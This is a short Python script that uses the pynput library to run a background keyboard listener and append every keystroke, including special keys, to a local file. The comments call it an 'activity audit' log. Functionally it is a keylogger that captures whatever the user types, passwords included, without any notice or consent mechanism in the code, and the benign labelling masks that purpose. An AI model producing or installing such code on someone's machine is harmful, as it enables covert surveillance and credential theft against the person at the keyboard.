from pynput import keyboard

# codigo ASCII

# Audit log target file configuration
log_file = "activity_audit.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f: # Append standard alphanumeric characters
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f: # Append special control keys
            f.write(f" [ {key} ] ")

# Instantiate the background asynchronous listener framework            
with keyboard.Listener(on_press=on_press) as listener: 
    listener.join()
    
